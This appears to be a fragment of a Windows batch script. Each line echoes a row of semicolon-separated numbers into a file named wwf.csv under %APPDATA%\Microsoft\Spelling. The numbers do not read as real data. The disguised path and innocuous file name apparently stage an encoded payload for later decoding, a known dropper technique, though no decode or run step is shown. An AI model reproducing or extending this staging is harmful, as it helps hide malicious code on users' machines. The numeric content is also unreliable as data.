>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;810.0;816.0;1849.805;0.809;0.801;0.3731;785.0;773.0;388.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8697.397;0.809;0.808;0.9489;644.0;732.0;686.0;5165.801;0.814;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2074;805.0;811.0;810.0;2514.661;0.752;0.746;0.5543;548.0;746.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.0;0672.746;0.548;0.444;0.1035;632.0;767.0;817.0;0585.808;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.6507;814.0;801.0;561.0;0218.810;0.801;0.817;0.6806;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;697.0;4375.808;0.644;0.732;0.8443;780.0;817.0;598.0;4923.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.805;0.799;0.6636;775.0;801.0;821.0;9581.484;0.811;0.807;0.5499;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;810.0;661.0;1240.398;0.755;0.655;0.9364;797.0;753.0;399.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2896.353;0.654;0.349;0.9077;657.0;351.0;552.0;9016.801;0.648;0.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7285;757.0;828.164;783.0;8976.821;0.815;0.816;0.4758;801.0;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.0;0581.683;0.801;0.499;0.7156;817.0;814.0;805.0;6964.816;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.344;0.3334;632.0;386.0;801.0;3375.814;0.815;0.805;0.9219;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;661.0;6969.452;0.646;0.648;0.9492;546.0;748.0;446.0;7449.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.644;0.332;0.2002;567.0;817.0;808.0;3919.816;0.817;0.814;0.1023;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;361.0;810.0;4072.801;0.817;0.816;0.7741;814.0;697.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5460.544;0.432;0.780;0.4846;817.0;798.0;808.0;4935.805;0.399;0.575;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0102;801.0;821.0;384.0;2731.811;0.807;0.801;0.3883;810.0;661.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(698.0;1078.748;0.751;0.802;0.8572;353.0;802.0;455.0;2006.802;0.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.349;0.8832;800.0;453.0;648.0;1145.697;0.751;0.797;0.1518;828.180;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;821.0;7610.815;0.816;0.801;0.4967;809.0;446.0;683.0;3403.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.818;0.7779;805.0;499.0;801.0;5022.777;0.811;0.800;0.8439;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;808.0;546.0;0874.487;0.801;0.698;0.5088;344.0;432.0;486.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5321.801;0.814;0.815;0.1615;805.0;811.0;810.0;0276.561;0.652;0.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4300;348.0;746.0;448.0;3752.546;0.648;0.444;0.0279;732.0;567.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;5037.808;0.816;0.817;0.5234;814.0;801.0;761.0;8534.810;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.8371;816.0;814.0;397.0;0106.808;0.644;0.732;0.2969;680.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;598.0;0471.808;0.805;0.799;0.6889;775.0;801.0;821.0;7023.684;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.807;0.8935;801.0;810.0;461.0;9648.751;0.749;0.398;0.6436;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;551.0;456.0;2640.453;0.454;0.697;0.5624;800.0;751.0;554.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8188.752;0.801;0.651;0.3881;553.0;828.176;383.0;4670.821;0.815;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2732;801.0;809.0;746.0;5890.783;0.801;0.814;0.2396;818.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(399.0;2781.801;0.480;0.814;0.7531;811.0;599.0;801.0;3046.815;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.544;0.0487;332.0;386.0;801.0;3477.814;0.815;0.805;0.9492;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;361.0;7973.752;0.746;0.548;0.0427;646.0;748.0;446.0;5336.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.644;0.532;0.4932;367.0;817.0;808.0;4754.816;0.817;0.814;0.9303;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;561.0;810.0;5862.801;0.817;0.816;0.2656;814.0;497.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0177.444;0.532;0.680;0.1397;817.0;498.0;808.0;3839.805;0.799;0.675;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9948;801.0;821.0;384.0;3998.811;0.807;0.801;0.8655;810.0;461.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(398.0;4928.348;0.551;0.802;0.6906;553.0;802.0;455.0;1272.802;0.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.449;0.5045;800.0;453.0;548.0;5026.797;0.651;0.697;0.2967;828.154;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.0;821.0;4405.815;0.816;0.801;0.9987;809.0;646.0;387.0;3226.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.598;0.544;0.3318;432.0;386.0;801.0;4837.814;0.815;0.805;0.2600;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;810.0;361.0;8346.652;0.446;0.748;0.6935;446.0;348.0;546.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4404.548;0.344;0.432;0.8416;367.0;817.0;808.0;3429.816;0.817;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6224;801.0;661.0;810.0;2452.801;0.817;0.816;0.2498;814.0;797.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;9115.344;0.332;0.480;0.2236;817.0;798.0;808.0;8084.805;0.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.475;0.2604;801.0;821.0;784.0;8974.811;0.807;0.801;0.3010;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(561.0;598.0;7535.348;0.751;0.802;0.8550;653.0;802.0;355.0;2619.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.349;0.449;0.3993;800.0;353.0;648.0;0816.397;0.451;0.597;0.9187;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.180;483.0;821.0;6139.815;0.816;0.801;0.2586;809.0;546.0;487.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1322.801;0.798;0.446;0.7317;365.0;598.0;815.0;8166.816;0.814;0.397;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4628;699.0;816.0;805.0;7667.811;0.810;0.815;0.9152;444.0;432.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(686.0;6720.801;0.814;0.815;0.4666;805.0;811.0;810.0;8654.561;0.552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.646;0.4081;648.0;646.0;648.0;3044.346;0.448;0.544;0.7342;532.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(767.0;817.0;4760.808;0.816;0.817;0.3805;814.0;801.0;461.0;4759.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.817;0.1617;816.0;814.0;497.0;8537.808;0.744;0.432;0.7661;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(380.0;817.0;698.0;7534.808;0.805;0.599;0.5903;675.0;801.0;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4398.784;0.811;0.807;0.8004;801.0;810.0;561.0;8333.651;0.349;0.798;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7911;802.0;751.0;356.0;5274.353;0.354;0.397;0.6156;800.0;551.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(454.0;3732.552;0.801;0.351;0.2611;553.0;828.178;683.0;0290.821;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.2495;801.0;809.0;646.0;6819.487;0.801;0.598;0.8333;646.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(468.0;821.0;8212.810;0.697;0.809;0.0226;805.0;499.0;668.0;8650.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.597;0.3859;344.0;532.0;786.0;1906.801;0.814;0.815;0.2273;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;811.0;810.0;8021.661;0.352;0.646;0.2486;648.0;746.0;748.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6415.746;0.748;0.544;0.0976;632.0;667.0;817.0;9614.808;0.816;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4256;814.0;801.0;361.0;5801.810;0.801;0.817;0.3253;816.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(397.0;5592.808;0.744;0.732;0.6204;480.0;817.0;798.0;3339.808;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.499;0.2765;475.0;801.0;821.0;6472.384;0.811;0.807;0.7656;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;761.0;9245.351;0.649;0.798;0.4349;802.0;351.0;656.0;1404.753;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.654;0.597;0.7409;800.0;451.0;354.0;0465.652;0.801;0.351;0.2121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(453.0;828.192;683.0;9992.821;0.815;0.816;0.3796;801.0;809.0;646.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1760.687;0.801;0.398;0.1638;346.0;668.0;821.0;6312.810;0.797;0.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2957;805.0;799.0;768.0;1215.497;0.816;0.597;0.2737;346.0;768.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;8432.815;0.805;0.803;0.8204;810.0;444.0;332.0;0901.686;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.2425;815.0;805.0;811.0;3294.810;0.461;0.352;0.6529;346.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.0;446.0;0002.348;0.346;0.648;0.2551;744.0;532.0;367.0;6423.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.816;0.7204;817.0;814.0;801.0;7733.561;0.810;0.801;0.1568;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;816.0;814.0;5906.797;0.808;0.544;0.5641;432.0;680.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5915.398;0.808;0.805;0.0900;699.0;375.0;801.0;5447.821;0.784;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9627;807.0;801.0;810.0;6718.661;0.651;0.649;0.7955;398.0;802.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(551.0;3905.656;0.553;0.654;0.5570;797.0;800.0;651.0;2004.654;0.452;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.7682;751.0;353.0;828.182;8818.683;0.821;0.815;0.8344;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;809.0;1864.646;0.687;0.801;0.1839;598.0;346.0;569.0;8461.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.805;0.4330;816.0;821.0;546.0;6970.568;0.801;0.815;0.4387;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;803.0;810.0;3991.544;0.432;0.686;0.8744;801.0;814.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2225.805;0.811;0.810;0.1186;661.0;752.0;646.0;1094.448;0.546;0.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7267;446.0;748.0;744.0;3983.732;0.367;0.817;0.4123;808.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;5278.814;0.801;0.561;0.2669;810.0;801.0;817.0;0887.816;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.397;0.9128;808.0;744.0;432.0;3906.380;0.817;0.598;0.8975;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;499.0;3568.675;0.801;0.821;0.3185;484.0;811.0;807.0;1745.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.461;0.6863;798.0;455.0;455.0;1421.697;0.453;0.599;0.3718;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(553.0;454.0;649.0;4842.557;0.751;0.352;0.1542;801.0;548.0;756.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9238.357;0.828;176.783;0.5055;821.0;815.0;816.0;5437.801;0.809;0.546;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2873;687.0;801.0;698.0;4839.746;0.569;0.820;0.3694;816.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;9293.815;0.805;0.811;0.8476;810.0;815.0;544.0;1687.532;0.786;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.2303;814.0;815.0;805.0;5013.811;0.810;0.661;0.1034;352.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(346.0;648.0;5701.546;0.548;0.446;0.7942;448.0;744.0;332.0;5122.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.808;0.3772;816.0;817.0;814.0;3601.801;0.661;0.810;0.2658;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;817.0;816.0;6769.814;0.797;0.808;0.2032;544.0;432.0;380.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7212.817;0.398;0.808;0.7583;805.0;799.0;375.0;2081.801;0.821;0.584;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9491;811.0;807.0;801.0;6892.810;0.661;0.351;0.1891;649.0;598.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;4365.451;0.356;0.653;0.3237;454.0;597.0;800.0;8344.751;0.754;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.552;0.8139;801.0;651.0;653.0;3395.828;190.683;0.821;0.4602;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;801.0;6845.809;0.546;0.687;0.8571;801.0;398.0;746.0;9304.569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.820;0.816;0.8785;801.0;810.0;815.0;9506.805;0.811;0.810;0.4440;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;446.0;568.0;1194.801;0.815;0.805;0.6031;803.0;810.0;544.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0097.532;0.586;0.801;0.5570;814.0;815.0;805.0;1817.811;0.810;0.361;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3694;352.0;746.0;448.0;4053.546;0.748;0.546;0.5945;648.0;444.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.0;7916.567;0.817;0.808;0.6938;816.0;817.0;814.0;5899.801;0.361;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.7571;801.0;817.0;816.0;2814.814;0.397;0.808;0.3316;344.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.0;580.0;3349.817;0.498;0.808;0.6748;805.0;599.0;575.0;1260.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.821;0.484;0.6719;811.0;807.0;801.0;4503.810;0.461;0.651;0.0400;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(349.0;798.0;802.0;8078.551;0.656;0.553;0.7105;654.0;697.0;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7940.651;0.754;0.452;0.4363;801.0;451.0;653.0;9930.828;168.783;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6101;815.0;816.0;801.0;0888.809;0.746;0.387;0.2046;801.0;798.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(346.0;7738.677;0.811;0.598;0.2528;805.0;808.0;801.0;7919.344;0.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.586;0.0599;801.0;814.0;815.0;3721.805;0.811;0.810;0.8170;361.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(652.0;546.0;9026.748;0.746;0.448;0.6643;346.0;448.0;544.0;1786.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.367;0.817;0.1326;808.0;816.0;817.0;9940.814;0.801;0.661;0.8583;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;801.0;817.0;4481.816;0.814;0.697;0.0260;808.0;444.0;332.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9321.480;0.817;0.498;0.4069;808.0;805.0;399.0;3964.675;0.801;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7287;784.0;811.0;807.0;1131.801;0.810;0.761;0.9316;698.0;448.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(651.0;9501.802;0.653;0.802;0.8533;455.0;802.0;649.0;8147.749;0.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.453;0.4237;348.0;497.0;751.0;9094.597;0.828;192.383;0.5369;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;816.0;5922.801;0.809;0.346;0.3398;387.0;801.0;398.0;6539.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.482;0.801;0.3106;803.0;817.0;808.0;3977.597;0.814;0.669;0.4131;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(820.0;812.0;814.0;0678.801;0.815;0.815;0.1940;805.0;811.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5014.815;0.444;0.732;0.3475;386.0;801.0;814.0;7035.815;0.805;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4851;810.0;661.0;452.0;5879.346;0.548;0.446;0.6763;748.0;746.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(548.0;4837.644;0.432;0.567;0.3994;817.0;808.0;816.0;6272.817;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.2356;361.0;810.0;801.0;5265.817;0.816;0.814;0.0408;397.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;344.0;3369.732;0.580;0.817;0.1758;398.0;808.0;805.0;9057.799;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.475;0.801;0.7321;821.0;484.0;811.0;7349.807;0.801;0.810;0.0746;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(361.0;798.0;748.0;4539.751;0.802;0.753;0.4216;802.0;455.0;802.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4269.649;0.349;0.800;0.4054;353.0;448.0;397.0;7051.551;0.597;0.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(170.4068;783.0;821.0;815.0;0930.816;0.801;0.809;0.5060;446.0;787.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;6000.698;0.446;0.482;0.4347;811.0;817.0;816.0;7272.805;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.803;0.1111;444.0;432.0;786.0;7044.801;0.814;0.815;0.2758;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;810.0;0316.761;0.752;0.346;0.6145;648.0;446.0;748.0;7413.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.648;0.444;0.8240;532.0;667.0;817.0;3434.808;0.816;0.817;0.4969;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;801.0;661.0;7800.810;0.801;0.817;0.2784;816.0;814.0;697.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8427.808;0.444;0.432;0.4750;480.0;817.0;798.0;0899.808;0.805;0.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6456;675.0;801.0;821.0;6849.484;0.811;0.807;0.7834;801.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(761.0;6870.651;0.649;0.498;0.1134;802.0;751.0;356.0;6497.653;0.354;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.697;0.0798;800.0;351.0;754.0;7580.652;0.801;0.551;0.8313;653.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.172;783.0;8265.821;0.815;0.816;0.1525;801.0;809.0;446.0;6614.687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.698;0.1590;546.0;583.0;801.0;1219.814;0.818;0.805;0.5694;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.0;801.0;815.0;6532.444;0.432;0.686;0.4877;801.0;814.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8374.805;0.811;0.810;0.0855;761.0;552.0;746.0;0022.548;0.346;0.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0438;546.0;548.0;644.0;1320.532;0.567;0.817;0.8982;808.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;0662.814;0.801;0.561;0.3824;810.0;801.0;817.0;8651.816;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.697;0.3294;808.0;544.0;632.0;5836.780;0.817;0.698;0.1396;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;499.0;3850.675;0.801;0.821;0.7301;584.0;811.0;807.0;3391.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.361;0.1587;598.0;648.0;551.0;0641.802;0.353;0.802;0.7011;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(555.0;802.0;349.0;7975.649;0.800;0.653;0.7441;348.0;697.0;551.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9108.797;0.828;156.587;0.4417;805.0;810.0;800.0;0250.811;0.819;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0761;566.0;497.0;815.0;9533.801;0.444;0.532;0.6309;386.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;3880.815;0.805;0.811;0.7473;810.0;761.0;652.0;5608.746;0.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.446;0.5790;648.0;346.0;348.0;6696.344;0.732;0.667;0.4874;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;816.0;0730.817;0.814;0.801;0.0853;661.0;810.0;801.0;6295.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.814;0.5371;697.0;808.0;444.0;7912.532;0.480;0.817;0.7219;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.0;808.0;805.0;7090.799;0.575;0.801;0.0968;821.0;484.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7702.807;0.801;0.810;0.3950;561.0;551.0;349.0;4101.798;0.802;0.751;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9430;456.0;553.0;354.0;8905.497;0.800;0.751;0.0425;354.0;452.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;5232.751;0.753;0.828;178.3148;777.0;805.0;499.0;0510.814;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.815;0.7326;811.0;802.0;816.0;8023.646;0.786;0.805;0.9160;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;497.0;8347.808;0.783;0.816;0.1975;817.0;800.0;805.0;7098.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.644;0.532;0.9307;786.0;801.0;814.0;5924.815;0.805;0.811;0.5366;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;461.0;452.0;6968.446;0.548;0.346;0.9153;348.0;646.0;648.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0447.744;0.332;0.767;0.2995;817.0;808.0;816.0;6430.817;0.814;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4333;661.0;810.0;801.0;1525.817;0.816;0.814;0.9464;497.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(544.0;5121.532;0.780;0.817;0.3666;698.0;808.0;805.0;7810.699;0.775;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.8098;821.0;484.0;811.0;5964.807;0.801;0.810;0.0581;361.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.0;748.0;2398.451;0.802;0.753;0.9678;802.0;655.0;802.0;2196.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.649;0.800;0.0226;453.0;448.0;597.0;4248.651;0.397;0.828;206.2930;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(377.0;805.0;599.0;0765.814;0.811;0.815;0.5307;811.0;802.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4649.346;0.686;0.805;0.0694;815.0;817.0;397.0;8661.808;0.683;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6944;817.0;800.0;805.0;2572.811;0.746;0.487;0.0689;805.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.0;5113.811;0.819;0.815;0.3950;446.0;770.0;811.0;7743.814;0.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.815;0.1011;544.0;432.0;686.0;2928.801;0.814;0.815;0.2715;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;810.0;2448.761;0.552;0.546;0.4942;748.0;646.0;748.0;0346.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.644;0.8913;332.0;667.0;817.0;3401.808;0.816;0.817;0.4488;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;801.0;661.0;7450.810;0.801;0.817;0.7878;816.0;814.0;697.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3061.808;0.444;0.632;0.2970;480.0;817.0;798.0;3733.808;0.805;0.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1348;375.0;801.0;821.0;8389.784;0.811;0.807;0.6559;801.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(461.0;2397.498;0.548;0.451;0.4768;802.0;753.0;802.0;1312.655;0.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.549;0.9574;749.0;800.0;353.0;7080.748;0.597;0.651;0.1214;597.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.172;386.0;5840.774;0.783;0.804;0.1788;697.0;814.0;812.0;2810.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.800;0.2149;801.0;780.0;814.0;5737.811;0.818;0.805;0.0297;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.0;801.0;814.0;0095.544;0.432;0.786;0.4190;801.0;814.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0179.805;0.811;0.810;0.8816;661.0;352.0;746.0;6557.648;0.646;0.548;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0881;746.0;748.0;344.0;6538.732;0.767;0.817;0.5938;808.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;0153.814;0.801;0.461;0.0829;810.0;801.0;817.0;7852.816;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.697;0.5789;808.0;444.0;332.0;8863.780;0.817;0.698;0.5101;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;499.0;7871.775;0.801;0.821;0.0559;684.0;811.0;807.0;2777.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.361;0.1021;798.0;748.0;351.0;7625.802;0.653;0.802;0.6926;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(655.0;802.0;449.0;4922.649;0.800;0.753;0.1036;348.0;397.0;651.0;
